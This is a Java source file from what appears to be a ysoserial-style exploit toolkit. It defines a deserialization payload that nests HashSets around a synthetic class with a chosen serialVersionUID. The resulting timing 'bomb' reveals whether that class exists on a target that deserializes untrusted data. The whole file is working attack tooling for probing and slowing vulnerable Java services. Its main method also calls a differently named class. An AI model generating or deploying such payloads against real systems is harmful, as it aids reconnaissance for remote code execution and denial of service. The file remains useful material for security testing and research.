package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.payloads.annotation.Authors;
import cn.butler.yso.payloads.util.ClassUtil;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Set;

@SuppressWarnings ( {
    "restriction"
} )
@Authors({ Authors.B0T1ER })
public class FindClassByBombSuid extends PayloadRunner implements ObjectPayload<Object> {
    public Object getObject ( final String command ) throws Exception {
        int depth = 28;

        String[] x = command.split("\\|");
        String className = x[0];
        String suid = x[1];
        depth = Integer.valueOf(x[2]);


        Class findClazz = ClassUtil.genClassBySuid(className,suid);
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }

    public static void main(final String[] args) throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        System.out.println(String.format("Start in %s",df.format(new Date())));
        PayloadRunner.run(FindClassByBomb.class, args);
        System.out.println(String.format("End in %s",df.format(new Date())));
    }
}
